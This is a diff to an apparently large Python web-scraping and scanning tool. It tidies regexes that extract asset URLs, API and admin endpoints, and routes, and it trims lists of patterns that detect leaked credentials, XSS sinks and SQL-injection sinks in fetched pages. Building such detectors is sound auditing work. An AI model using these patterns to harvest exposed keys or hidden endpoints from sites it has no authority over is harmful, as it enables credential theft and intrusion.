@@ -709,21 +709,21 @@ except ImportError:
 # ══════════════════════════════════════════════════
 
 _RE_URL_IN_HTML = re.compile(
-    r"""["\x27`]((https?://|/)[^"\x27`<>\s]+\.(js|css|woff2?|ttf|otf|eot"""
-    r"""|png|jpg|jpeg|gif|svg|webp|avif|ico"""
-    r"""|mp4|webm|mp3|ogg|wav|wasm"""
-    r"""|pdf|zip|apk|json|xml|yaml|yml|sql|env|bak|config|txt|md"""
-    r"""|php|asp|aspx|jsp|cgi|py|rb|go|java|c|cpp|h|hpp|sh|bat|ps1"""
-    r"""|tar|gz|7z|rar|dmg|pkg|bin|exe|msi|deb|rpm"""
-    r"""|map|ts|tsx|jsx|vue|svelte|less|scss|sass|styl"""
-    r"""|wasm|manifest|webmanifest|appcache|worker|sw|service-worker"""
-    r"""|apk|ipa|xap|appx|appxbundle|msix|msixbundle"""
-    r"""|doc|docx|xls|xlsx|ppt|pptx|odt|ods|odp|rtf|csv|tsv"""
-    r"""|mp4|webm|mkv|avi|mov|wmv|flv|m4v|3gp|3g2"""
-    r"""|mp3|wav|ogg|flac|aac|m4a|wma|mid|midi|opus"""
-    r"""|woff|woff2|ttf|otf|eot|svg|afm|pfb|pfa|pcf|fnt|fon|dfont|ttc"""
-    r"""|png|jpg|jpeg|gif|svg|webp|avif|ico|bmp|tiff|psd|ai|eps|indd|raw|heif|heic"""
-    r""")(\?[^"\x27`<>\s]*)?)[\"'`]""",
+    r'["\'`]((https?://|/)[^"\'`<>\s]+\.(js|css|woff2?|ttf|otf|eot'
+    r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
+    r'|mp4|webm|mp3|ogg|wav|wasm'
+    r'|pdf|zip|apk|json|xml|yaml|yml|sql|env|bak|config|txt|md'
+    r'|php|asp|aspx|jsp|cgi|py|rb|go|java|c|cpp|h|hpp|sh|bat|ps1'
+    r'|tar|gz|7z|rar|dmg|pkg|bin|exe|msi|deb|rpm'
+    r'|map|ts|tsx|jsx|vue|svelte|less|scss|sass|styl'
+    r'|wasm|manifest|webmanifest|appcache|worker|sw|service-worker'
+    r'|apk|ipa|xap|appx|appxbundle|msix|msixbundle'
+    r'|doc|docx|xls|xlsx|ppt|pptx|odt|ods|odp|rtf|csv|tsv'
+    r'|mp4|webm|mkv|avi|mov|wmv|flv|m4v|3gp|3g2'
+    r'|mp3|wav|ogg|flac|aac|m4a|wma|mid|midi|opus'
+    r'|woff|woff2|ttf|otf|eot|svg|afm|pfb|pfa|pcf|fnt|fon|dfont|ttc'
+    r'|png|jpg|jpeg|gif|svg|webp|avif|ico|bmp|tiff|psd|ai|eps|indd|raw|heif|heic'
+    r')(\?[^"\'`<>\s]*)?)["\' `]',
     re.IGNORECASE
 )
 
@@ -738,19 +738,19 @@ _RE_CSS_IMPORT  = re.compile(r'''@import\s+(?:url\()?(?:"|')?([^)"'\s;]+)(?:"|')
 _RE_CSS_FONT    = re.compile(r'''@font-face\s*\{[^}]*src\s*:[^}]*url\(([^)]+)\)''', re.DOTALL | re.IGNORECASE)
 _RE_JSONLD_IMG  = re.compile(r'"(https?://[^"]{8,}\.(?:jpg|jpeg|png|webp|gif|svg|avif))"', re.IGNORECASE)
 _RE_JS_FULL_URL = re.compile(
-    r'''["`'](https?://[^"`'<>\s]{8,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`']''',
+    r'["`\'](https?://[^"`\'<>\s]{8,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`\']',
     re.IGNORECASE
 )
 _RE_JS_REL_URL  = re.compile(
-    r'''["`'](/[^"`'<>\s]{3,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`']''',
+    r'["`\'](/[^"`\'<>\s]{3,}\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|webp|avif|svg|mp4|webm|mp3|pdf|wasm))["`\']',
     re.IGNORECASE
 )
 _RE_SITEMAP_LOC = re.compile(r'<loc>\s*(https?://[^<]+)\s*</loc>')
 _RE_ROBOTS_SM   = re.compile(r'(?i)sitemap:\s*(https?://\S+)')
 # v35 new patterns for enhanced asset extraction
-_RE_NEXT_CHUNK  = re.compile(r"/_next/static/[^\s<>]+")
-_RE_WEBPACK_CHUNK = re.compile(r"""["\x27`]([a-f0-9]{8,20}\.[a-z0-9]+\.(?:js|css))["\x27`]""")
-_RE_WEBPACK_PUBLIC = re.compile(r"""__webpack_public_path__\s*=\s*["\x27`](.*?)["\x27`]|publicPath\s*:\s*["\x27`](.*?)["\x27`]""")
+_RE_NEXT_CHUNK  = re.compile(r'/_next/static/[^\s"\'<>]+')
+_RE_WEBPACK_CHUNK = re.compile(r'["`\']([a-f0-9]{8,20}\.[a-z0-9]+\.(?:js|css))["`\']')
+_RE_WEBPACK_PUBLIC = re.compile(r'__webpack_public_path__\s*=\s*["`\'](.*?)["`\']|publicPath\s*:\s*["`\'](.*?)["`\']')
 _RE_SRCSET_PART = re.compile(r'([^\s,]+)(?:\s+(?:\d+(?:\.\d+)?[wx]))?')
 _RE_SW_REGISTER = re.compile(r'''navigator\.serviceWorker\.register\s*\(\s*["`']([^`'"]+)["`']''')
 _RE_WIN_STATE   = re.compile(r'''window\.__(?:INITIAL_STATE|PRELOADED_STATE|NEXT_DATA|NUXT__)__\s*=\s*(\{.{20,5000}?\})''', re.DOTALL)
@@ -758,8 +758,8 @@ _RE_WIN_STATE   = re.compile(r'''window\.__(?:INITIAL_STATE|PRELOADED_STATE|NEXT
 _RE_SRI_HASH       = re.compile(r'^sha(?:256|384|512)-[A-Za-z0-9+/=]{20,}$')
 _RE_CSS_URL_SAFE   = re.compile(r'''url\(\s*(?:"([^"]+)"|'([^']+)'|([^)"'\s]+))\s*\)''', re.IGNORECASE)
 _RE_CSS_FONT_MULTI = re.compile(r'''url\(\s*(?:"([^"]+)"|'([^']+)'|([^)"'\s]+))\s*\)(?:[^;]*format\([^)]+\))?''', re.IGNORECASE | re.DOTALL)
-_RE_VITE_ASSET     = re.compile(r'''["\x27`](/assets/[^"\x27`<>\s]+\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|svg|webp|avif|mp4|webm|mp3|pdf|wasm))["\x27`]''', re.IGNORECASE)
-_RE_PROTO_REL_URL  = re.compile(r"""["\x27`](//[a-zA-Z0-9][^"\x27`<>\s]{4,})["\x27`]""")
+_RE_VITE_ASSET     = re.compile(r'''["'`](/assets/[^"'`<>\s]+\.(?:js|css|woff2?|ttf|otf|eot|png|jpg|jpeg|gif|svg|webp|avif|mp4|webm|mp3|pdf|wasm))["'`]''', re.IGNORECASE)
+_RE_PROTO_REL_URL  = re.compile(r'''["'`](//[a-zA-Z0-9][^"'`<>\s]{4,})["'`]''')
 # Lazy-load attributes for <img> — extended for modern frameworks
 _LAZY_LOAD_ATTRS = (
     'src', 'data-src', 'data-lazy', 'data-original', 'data-lazy-src',
@@ -1792,7 +1792,7 @@ def fetch_with_puppeteer(url: str) -> str | None:
         return None
 
     # Strict URL chars whitelist (extra layer)
-    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&()*+,;=%]+$', url):
+    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
         logger.warning("Puppeteer blocked URL with invalid characters")
         return None
 
@@ -2165,7 +2165,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
                 for jm in _RE_JSONLD_IMG.finditer(blob):  # type: ignore[name-defined]
                     _add(jm.group(1))
             # Protocol-relative in JS ("//cdn.example.com/lib.js")
-            for m in _RE_PROTO_REL_URL.finditer(inline):  # type: ignore[name-defined]
+            for m in _RE_PROTO_REL_URL.finditer(inline):
                 _add(m.group(1))
         except Exception as e:
             logger.debug("extract_assets: inline JS mining error: %s", e)
@@ -2282,7 +2282,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
         # meta refresh redirect URL
         if tag.get('http-equiv', '').lower() == 'refresh':
             content = tag.get('content', '')
-            url_m = re.search(r'url\s*=\s*["\x27"]?([^"\x27;\s]+)', content, re.IGNORECASE)
+            url_m = re.search(r'url\s*=\s*["\']?([^"\';\s]+)', content, re.IGNORECASE)
             if url_m:
                 _add(url_m.group(1))
 
@@ -2297,7 +2297,7 @@ def extract_assets(html: str, page_url: str, soup=None) -> set:
 
     # ══ 15. Raw HTML regex sweep (server-injected paths) ════════
     #   protocol-relative sweep
-    for m in _RE_PROTO_REL_URL.finditer(html):  # type: ignore[name-defined]
+    for m in _RE_PROTO_REL_URL.finditer(html):
         _add(m.group(1))
     try:
         for m in _RE_URL_IN_HTML.finditer(html):  # type: ignore[name-defined]
@@ -2667,29 +2667,29 @@ ALL_API_PATHS = list(dict.fromkeys(
 _JS_API_PATTERNS = [
     re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
     re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL|baseUrl|apiBase|BASE_URL|API_BASE)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
-    re.compile(r"""['"`](/api/[^\\s\x27"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/rest/[^\\s\x27"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/v\d+/[^\\s\x27"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
     re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
-    re.compile(r"""['"`](/graphql[^\\s\x27"`\?#]{0,50})['"`]"""),
+    re.compile(r"""['"`](/graphql[^\s'"`\?#]{0,50})['"`]"""),
     re.compile(r"""['"`](/api/[a-zA-Z0-9_\-/]{2,80})['"`]"""),
-    re.compile(r"""(wss?://[^\\s\x27"` ]{5,200})"""),
-    re.compile(r"""['"`](https://[a-z0-9]+\.supabase\.co/[^\\s\x27"` ]{5,100})['"`]"""),
-    re.compile(r"""['"`](/internal/[^\\s\x27"`\?#]{3,80})['"`]"""),
-    re.compile(r"""['"`](/private/[^\\s\x27"`\?#]{3,80})['"`]"""),
+    re.compile(r"""(wss?://[^\s'"` ]{5,200})"""),
+    re.compile(r"""['"`](https://[a-z0-9]+\.supabase\.co/[^\s'"` ]{5,100})['"`]"""),
+    re.compile(r"""['"`](/internal/[^\s'"`\?#]{3,80})['"`]"""),
+    re.compile(r"""['"`](/private/[^\s'"`\?#]{3,80})['"`]"""),
     # V24: More patterns
-    re.compile(r"""['"`](/admin/[^\\s\x27"`\?#]{3,80})['"`]"""),
-    re.compile(r"""['"`](/wp-json/[^\\s\x27"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/jsonapi/[^\\s\x27"`\?#]{3,100})['"`]"""),
-    re.compile(r"""['"`](/socket\.io[^\\s\x27"`\?#]{0,50})['"`]"""),
+    re.compile(r"""['"`](/admin/[^\s'"`\?#]{3,80})['"`]"""),
+    re.compile(r"""['"`](/wp-json/[^\s'"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/jsonapi/[^\s'"`\?#]{3,100})['"`]"""),
+    re.compile(r"""['"`](/socket\.io[^\s'"`\?#]{0,50})['"`]"""),
     re.compile(r"""(?:path|route|href|to)\s*[:=]\s*['"`]([/][a-zA-Z0-9_\-/]{3,80})['"`]"""),
     re.compile(r"""process\.env\.[A-Z_]+\s*[||=]+\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""REACT_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""NEXT_PUBLIC_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
     re.compile(r"""VUE_APP_[A-Z_]+\s*[:=]\s*['"`]([^'"`\s]{5,150})['"`]"""),
-    re.compile(r"""['"`](/sse/[^\\s\x27"`\?#]{2,60})['"`]"""),
-    re.compile(r"""['"`](/stream/[^\\s\x27"`\?#]{2,60})['"`]"""),
-    re.compile(r"""['"`](/events/[^\\s\x27"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/sse/[^\s'"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/stream/[^\s'"`\?#]{2,60})['"`]"""),
+    re.compile(r"""['"`](/events/[^\s'"`\?#]{2,60})['"`]"""),
 ]
 
 # ══════════════════════════════════════════════════
@@ -2698,113 +2698,49 @@ _JS_API_PATTERNS = [
 # ══════════════════════════════════════════════════
 
 _ANALYZE_SECRET_PATTERNS = [
-    # ── Cloud / AWS ────────────────────────────────────────────────────
+    # Cloud / infra
     (r'AKIA[0-9A-Z]{16}',                                                                 '🔴 AWS Access Key'),
-    (r'ASIA[0-9A-Z]{16}',                                                                 '🔴 AWS Temp Access Key'),
-    (r'AROA[0-9A-Z]{16}',                                                                 '🔴 AWS Role Key'),
-    (r'AIPA[0-9A-Z]{16}',                                                                 '🔴 AWS Instance Key'),
-    (r'(?i)aws[_-]?secret[_-]?(?:access[_-]?)?key\s*[=:]\s*["\x27"]?([A-Za-z0-9+/]{40})', '🔴 AWS Secret Key'),
-    (r'FwoGZXIvYXdzE[a-zA-Z0-9/+]{100,}',                                               '🔴 AWS Session Token'),
-    # ── Google / GCP ───────────────────────────────────────────────────
-    (r'AIza[0-9A-Za-z_\-]{35}',                                                          '🟠 Google API Key'),
-    (r'(?i)firebase[_-]?api[_-]?key\s*[=:]\s*["\x27"]?([A-Za-z0-9_\-]{30,})',             '🟠 Firebase Key'),
-    (r'"apiKey"\s*:\s*"(AIza[0-9A-Za-z_\-]{35})"',                                      '🔴 Firebase Config (apiKey)'),
-    (r'https://[a-z0-9\-]+\.firebaseio\.com',                                             '🟡 Firebase DB URL'),
-    (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',                           '🔴 Google OAuth ClientID'),
-    (r'"type"\s*:\s*"service_account"',                                                   '🔴 GCP Service Account JSON'),
-    # ── Azure ──────────────────────────────────────────────────────────
-    (r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+',               '🔴 Azure Storage ConnStr'),
-    (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\\s"\x27]{10,}',                          '🔴 Azure SAS Token'),
-    # ── Stripe / Payment ───────────────────────────────────────────────
-    (r'sk_live_[0-9a-zA-Z]{24,}',                                                        '🔴 Stripe Secret (LIVE)'),
-    (r'rk_live_[0-9a-zA-Z]{24,}',                                                        '🔴 Stripe Restricted (LIVE)'),
-    (r'sk_test_[0-9a-zA-Z]{24,}',                                                        '🟡 Stripe Secret (test)'),
-    (r'pk_live_[0-9a-zA-Z]{24,}',                                                        '🟡 Stripe Public (LIVE)'),
-    (r'EAAA[a-zA-Z0-9\-_]{60,}',                                                         '🔴 Square Access Token'),
-    (r'rzp_live_[a-zA-Z0-9]{14}',                                                        '🔴 Razorpay Live Key'),
-    (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',                           '🔴 Braintree Production Token'),
-    # ── GitHub / GitLab / VCS ──────────────────────────────────────────
-    (r'ghp_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub PAT'),
-    (r'github_pat_[a-zA-Z0-9_]{82}',                                                     '🔴 GitHub Fine-grained Token'),
-    (r'gho_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub OAuth Token'),
-    (r'ghs_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub App Token'),
-    (r'ghr_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub Refresh Token'),
-    (r'glpat-[0-9a-zA-Z_\-]{20}',                                                        '🔴 GitLab PAT'),
-    (r'glrt-[0-9a-zA-Z_\-]{20}',                                                         '🟠 GitLab Runner Token'),
-    (r'npm_[A-Za-z0-9]{36}',                                                             '🔴 NPM Publish Token'),
-    # ── Messaging / Email ──────────────────────────────────────────────
-    (r'xox[baprs]-[0-9a-zA-Z\-]+',                                                       '🟠 Slack Token'),
-    (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+',         '🔴 Slack Webhook'),
-    (r'(?i)discord[_-]?(token|bot)[_-]?[=:]\s*["\x27"]?([A-Za-z0-9_.\-]{50,})',           '🟠 Discord Bot Token'),
-    (r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_\-]+',               '🟠 Discord Webhook'),
-    (r'\d{8,10}:AA[0-9a-zA-Z_\-]{33}',                                                  '🔴 Telegram Bot Token'),
-    (r'SG\.[A-Za-z0-9_\-\.]{20,}',                                                       '🟠 SendGrid API Key'),
-    (r'key-[0-9a-zA-Z]{32}',                                                             '🔴 Mailgun API Key'),
-    (r'[0-9a-f]{32}-us\d{1,2}',                                                          '🔴 Mailchimp API Key'),
-    # ── AI / ML ────────────────────────────────────────────────────────
-    (r'sk-[a-zA-Z0-9]{48}',                                                              '🔴 OpenAI API Key'),
-    (r'sk-proj-[a-zA-Z0-9\-_]{80,}',                                                    '🔴 OpenAI Project Key'),
-    (r'sk-ant-[a-zA-Z0-9\-_]{90,}',                                                     '🔴 Anthropic API Key'),
-    (r'hf_[a-zA-Z]{34}',                                                                 '🟡 HuggingFace Token'),
-    (r'r8_[a-zA-Z0-9]{40}',                                                              '🟠 Replicate API Token'),
-    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\x27"]?(sk-[A-Za-z0-9]{48})',          '🔴 OpenAI Key (env var)'),
-    # ── Database URLs ──────────────────────────────────────────────────
-    (r'mongodb(?:\+srv)?://[^\\s"\x27]<>{}\[\]]{8,}',                                        '🔴 MongoDB URI'),
-    (r'postgres(?:ql)?://[^\\s"\x27]<>{}\[\]]{8,}',                                          '🔴 PostgreSQL URI'),
-    (r'mysql://[^\\s"\x27]<>{}\[\]]{8,}',                                                    '🔴 MySQL URI'),
-    (r'redis://[^\\s"\x27]<>{}\[\]]{8,}',                                                    '🟠 Redis URI'),
-    (r'amqp://[^\\s"\x27]<>{}\[\]]{8,}',                                                     '🟠 RabbitMQ/AMQP URI'),
-    (r'clickhouse://[^\\s"\x27]<>{}\[\]]{8,}',                                               '🟠 ClickHouse URI'),
-    (r'https?://[^:]+:[^@]+@[^\\s"\x27]<>]+:9200',                                          '🔴 Elasticsearch (auth)'),
-    (r'(?i)db[_-]?password\s*[=:]\s*["\x27"]([^\\s"\x27]]{4,})',                               '🔴 DB Password'),
-    # ── JWT / Tokens ───────────────────────────────────────────────────
-    (r'eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}',             '🔴 JWT Token'),
-    (r'(?i)jwt[_-]?secret\s*[=:]\s*["\x27"]([A-Za-z0-9_\-+=/]{16,})',                     '🔴 JWT Secret'),
-    (r'(?i)(?:access[_-]?token|auth[_-]?token)\s*[=:]\s*["\x27"]([A-Za-z0-9_.\-]{20,})', '🟠 Auth/Access Token'),
-    (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',                                             '🟠 Bearer Token'),
-    # ── Private Keys / Certs ───────────────────────────────────────────
-    (r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',                          '🔴 Private Key Block'),
-    (r'-----BEGIN CERTIFICATE-----',                                                      '🟡 Certificate Block'),
-    (r'(?i)ssh-(?:rsa|dss|ed25519|ecdsa)\s+[A-Za-z0-9+/=]{100,}',                     '🔴 SSH Public Key'),
-    # ── SaaS / DevOps ──────────────────────────────────────────────────
-    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\x27"]?(sk-[A-Za-z0-9]{48})',          '🔴 OpenAI Key'),
-    (r'(?i)twilio[_-]?(?:auth[_-]?token|account[_-]?sid)\s*[=:]\s*["\x27"]?([A-Za-z0-9]{32,})', '🟠 Twilio Token'),
-    (r'NRAK-[A-Z0-9]{27}',                                                               '🔴 New Relic API Key'),
-    (r'https://[0-9a-f]{32}@[a-z0-9.]+\.sentry\.io/\d+',                               '🟠 Sentry DSN'),
-    (r'(?i)datadog.{0,20}[0-9a-f]{32}',                                                 '🔴 Datadog API Key'),
-    (r'shpat_[a-fA-F0-9]{32}',                                                           '🔴 Shopify Admin Token'),
-    (r'shpss_[a-fA-F0-9]{32}',                                                           '🔴 Shopify Shared Secret'),
-    (r'secret_[a-zA-Z0-9]{43}',                                                          '🔴 Notion API Token'),
-    (r'hvs\.[a-zA-Z0-9_\-]{24,}',                                                       '🔴 HashiCorp Vault Token'),
-    (r'dp\.pt\.[a-zA-Z0-9]{40,}',                                                       '🔴 Doppler Service Token'),
-    (r'(?i)supabase[_-]?(?:anon|service)[_-]?(?:key|role)["\s:=]+["\x27"][A-Za-z0-9_\-\.]{30,}["\x27"]', '🔴 Supabase Key'),
-    (r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_\-]{20,}',                   '🔴 Supabase JWT (anon/service)'),
-    (r'(?i)planetscale[_-]?(?:password|token)["\s:=]+["\x27"][A-Za-z0-9_\-]{20,}["\x27"]',  '🔴 PlanetScale Token'),
-    (r'(?i)neon[_-]?(?:database[_-]?)?url["\s:=]+["\x27"]postgresql://[^"\x27]{10,}["\x27"]', '🔴 Neon DB URL'),
-    (r'(?i)vercel[_-]?token["\s:=]+["\x27"][A-Za-z0-9_\-]{24,}["\x27"]',                    '🟠 Vercel Token'),
-    (r'(?i)railway[_-]?token["\s:=]+["\x27"][A-Za-z0-9_\-]{40,}["\x27"]',                   '🟠 Railway Token'),
-    (r'pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_\-]{22,}',                                    '🟠 Mapbox Token'),
-    (r'(?i)algolia[_-]?(?:api[_-]?)?key["\s:=]+["\x27"][A-Za-z0-9]{32}["\x27"]',            '🟠 Algolia API Key'),
-    (r'lin_api_[a-zA-Z0-9]{40}',                                                        '🔴 Linear API Key'),
-    (r'dop_v1_[a-f0-9]{64}',                                                            '🔴 DigitalOcean PAT'),
-    # ── Generic High-Risk ──────────────────────────────────────────────
-    (r'(?i)(?:api[_-]?key|apikey|api_token)\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',     '🟠 Generic API Key'),
-    (r'(?i)(?:secret[_-]?key|app[_-]?secret)\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',   '🟠 Secret Key'),
-    (r'(?i)password\s*[=:]\s*["\x27"]([^\\s"\x27]]{8,})',                                      '🟡 Hardcoded Password'),
-    (r'(?i)private[_-]?key\s*[=:]\s*["\x27"]([A-Za-z0-9_\-+/=]{32,})',                  '🔴 Private Key Value'),
-    (r'(?i)(?:10\.\d{1,3}|192\.168|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}',   '🟡 Internal IP Leak'),
-    (r'(?i)encryption[_-]?key\s*[=:]\s*["\x27"]([A-Za-z0-9+/=]{16,})',                  '🔴 Encryption Key'),
-    (r'(?i)hmac[_-]?secret\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',                     '🟠 HMAC Secret'),
+    (r'(?i)aws[_-]?secret[_-]?(?:access[_-]?)?key\s*[=:]\s*["\']?([A-Za-z0-9+/]{40})', '🔴 AWS Secret Key'),
+    (r'AIza[0-9A-Za-z_\-]{35}',                                                           '🟠 Google API Key'),
+    (r'(?i)firebase[_-]?api[_-]?key\s*[=:]\s*["\']?([A-Za-z0-9_\-]{30,})',              '🟠 Firebase Key'),
+    # Payment
+    (r'sk_live_[0-9a-zA-Z]{24,}',                                                         '🔴 Stripe Secret (LIVE)'),
+    (r'sk_test_[0-9a-zA-Z]{24,}',                                                         '🟡 Stripe Secret (test)'),
+    (r'pk_live_[0-9a-zA-Z]{24,}',                                                         '🟡 Stripe Public (LIVE)'),
+    # Auth tokens
+    (r'ghp_[a-zA-Z0-9]{36}',                                                              '🔴 GitHub PAT'),
+    (r'github_pat_[a-zA-Z0-9_]{82}',                                                      '🔴 GitHub Fine-grained Token'),
+    (r'xox[baprs]-[0-9a-zA-Z\-]+',                                                        '🟠 Slack Token'),
+    (r'(?i)discord[_-]?(token|bot)[_-]?[=:]\s*["\']?([A-Za-z0-9_.\-]{50,})',            '🟠 Discord Token'),
+    # Database URLs
+    (r'mongodb(?:\+srv)?://[^\s"\'<>{}\[\]]{8,}',                                         '🔴 MongoDB URL (creds)'),
+    (r'postgres(?:ql)?://[^\s"\'<>{}\[\]]{8,}',                                           '🔴 PostgreSQL URL (creds)'),
+    (r'mysql://[^\s"\'<>{}\[\]]{8,}',                                                     '🔴 MySQL URL (creds)'),
+    (r'redis://[^\s"\'<>{}\[\]]{8,}',                                                     '🟠 Redis URL'),
+    # Generic API keys
+    (r'(?i)(?:api[_-]?key|apikey|api_token)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})',       '🟠 API Key'),
+    (r'(?i)(?:secret[_-]?key|app[_-]?secret)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})',     '🟠 Secret Key'),
+    (r'(?i)(?:access[_-]?token|auth[_-]?token)\s*[=:]\s*["\']([A-Za-z0-9_.\-]{20,})',  '🟠 Auth Token'),
+    (r'(?i)jwt[_-]?secret\s*[=:]\s*["\']([A-Za-z0-9_\-+=/]{16,})',                      '🟠 JWT Secret'),
+    (r'(?i)password\s*[=:]\s*["\']([^\s"\']{8,})',                                        '🟡 Hardcoded Password'),
+    (r'(?i)db[_-]?password\s*[=:]\s*["\']([^\s"\']{4,})',                                '🔴 DB Password'),
+    # SaaS
+    (r'SG\.[A-Za-z0-9_\-\.]{20,}',                                                        '🟠 SendGrid Key'),
+    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\']?(sk-[A-Za-z0-9]{48})',           '🔴 OpenAI Key'),
+    (r'sk-[A-Za-z0-9]{48}',                                                               '🔴 OpenAI Key (direct)'),
+    (r'(?i)twilio[_-]?(?:auth[_-]?token|account[_-]?sid)\s*[=:]\s*["\']?([A-Za-z0-9]{32,})', '🟠 Twilio Token'),
+    # Private keys
+    (r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',                           '🔴 Private Key Block'),
 ]
 
 _ROUTE_PATTERNS = [
-    re.compile(r'''(?:path|exact\s+path)\s*=\s*{?\s*["\x27`]([/][^"\x27`\s,)>]{1,100})["\x27`]'''),
-    re.compile(r'''<Route[^>]+(?:path|to)\s*=\s*["\x27`]([/][^"\x27`\s,)>]{1,100})["\x27`]'''),
+    re.compile(r'''(?:path|exact\s+path)\s*=\s*{?\s*["'`]([/][^"'`\s,)>]{1,100})["'`]'''),
+    re.compile(r'''<Route[^>]+(?:path|to)\s*=\s*["'`]([/][^"'`\s,)>]{1,100})["'`]'''),
     re.compile(r'''pages/([a-z0-9_\-\[\]/]+)\.(?:tsx?|jsx?)''', re.IGNORECASE),
     re.compile(r'''app/([a-z0-9_\-\[\]/]+)/page\.(?:tsx?|jsx?)''', re.IGNORECASE),
-    re.compile(r'''(?:router|app)\s*\.\s*(get|post|put|delete|patch)\s*\(\s*["\x27`]([^"\x27`\s]{2,80})["\x27`]'''),
-    re.compile(r'''path\s*:\s*["\x27`]([/][^"\x27`\s,}{]{1,100})["\x27`]'''),
-    re.compile(r'''path\s*:\s*["\x27`]([^"\x27`\s]{2,80})["\x27`]\s*,\s*component'''),
+    re.compile(r'''(?:router|app)\s*\.\s*(get|post|put|delete|patch)\s*\(\s*["'`]([^"'`\s]{2,80})["'`]'''),
+    re.compile(r'''path\s*:\s*["'`]([/][^"'`\s,}{]{1,100})["'`]'''),
+    re.compile(r'''path\s*:\s*["'`]([^"'`\s]{2,80})["'`]\s*,\s*component'''),
 ]
 
 _XSS_SINK_PATTERNS = [
@@ -2812,8 +2748,8 @@ _XSS_SINK_PATTERNS = [
     (re.compile(r'outerHTML\s*[+]?='),             '🔴 outerHTML assignment'),
     (re.compile(r'document\.write\s*\('),           '🔴 document.write()'),
     (re.compile(r'\beval\s*\('),                    '🔴 eval() call'),
-    (re.compile(r'setTimeout\s*\(\s*["\x27"]'),        '🟠 setTimeout(string)'),
-    (re.compile(r'setInterval\s*\(\s*["\x27"]'),       '🟠 setInterval(string)'),
+    (re.compile(r'setTimeout\s*\(\s*["\']'),        '🟠 setTimeout(string)'),
+    (re.compile(r'setInterval\s*\(\s*["\']'),       '🟠 setInterval(string)'),
     (re.compile(r'\.html\s*\([^)]{0,200}\+'),       '🟠 jQuery .html() + concat'),
     (re.compile(r'dangerouslySetInnerHTML'),         '🟠 React dangerouslySetInnerHTML'),
     (re.compile(r'v-html\s*='),                     '🟠 Vue v-html'),
@@ -2821,9 +2757,9 @@ _XSS_SINK_PATTERNS = [
 
 _SQLI_SINK_PATTERNS = [
     (re.compile(r'(?i)(?:SELECT|INSERT|UPDATE|DELETE)\s+.*?\+\s*(?:req\.|query\.|param|input|user)'), '🔴 SQL string concat'),
-    (re.compile(r'(?i)(?:query|execute|db\.run)\s*\(\s*["\x27"](?:SELECT|INSERT|UPDATE|DELETE).*?\+'),   '🔴 DB query concat'),
+    (re.compile(r'(?i)(?:query|execute|db\.run)\s*\(\s*["\'](?:SELECT|INSERT|UPDATE|DELETE).*?\+'),   '🔴 DB query concat'),
     (re.compile(r'(?i)\.raw\s*\([^)]+\+'),                                                             '🟠 Raw ORM query'),
